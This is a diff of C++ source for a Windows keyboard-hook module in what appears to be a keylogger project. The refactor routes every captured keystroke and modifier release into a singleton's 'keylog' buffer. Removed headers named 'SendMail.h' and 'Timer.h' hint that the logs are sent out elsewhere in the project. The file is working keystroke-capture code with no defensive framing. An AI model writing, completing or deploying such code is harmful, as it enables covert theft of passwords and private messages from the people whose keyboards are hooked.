@@ -1,24 +1,21 @@
 #include <iostream>
 #include <fstream>
-#include <stdexcept>
 #include <windows.h>
 
 #include <vector>
 #include <string>
 
+#include "IO.h"
 #include "KeyConstants.h"
-#include "Timer.h"
-#include "SendMail.h"
-
 #include "KeyboardManager.h"
 
-KeyboardManager::KeyboardManager()
-{ }
-
-LRESULT KeyboardManager::KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
+/** 
+ * Handles key presses and releases
+ **/
+LRESULT KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 {
 	if (nCode < 0)
-		CallNextHookEx(eHook, nCode, wparam, lparam);
+		CallNextHookEx(KeyboardManager::GetInstance().GetHook(), nCode, wparam, lparam);
 	KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;
 
 	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
@@ -28,13 +25,10 @@ LRESULT KeyboardManager::KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 		 * it can't be found in the map, then
 		 * append [UNKNOWN] instead
 		 **/
-		try {
-			keylog += KEYS.at(kbs->vkCode).Name;
-		} catch (const std::out_of_range& e) {
-			keylog += "[UNKNOWN]";
-		}
+		KeyboardManager::GetInstance().keylog += Keys::GetKey(kbs->vkCode);
+
 		if (kbs->vkCode == VK_RETURN)
-			keylog += '\n';
+			KeyboardManager::GetInstance().keylog += '\n';
 	}
 	else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
 	{
@@ -53,13 +47,13 @@ LRESULT KeyboardManager::KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 			|| key == VK_LWIN
 			|| key == VK_RWIN)
 		{
-			std::string KeyName = KEYS[kbs->vkCode].Name;
+			std::string KeyName = Keys::GetKey(kbs->vkCode);
 			KeyName.insert(1, "/");
-			keylog += KeyName;
+			KeyboardManager::GetInstance().keylog += KeyName;
 		}
 	}
 
-	return CallNextHookEx(eHook, nCode, wparam, lparam);
+	return CallNextHookEx(KeyboardManager::GetInstance().GetHook(), nCode, wparam, lparam);
 }
 
 bool KeyboardManager::InstallHooks()
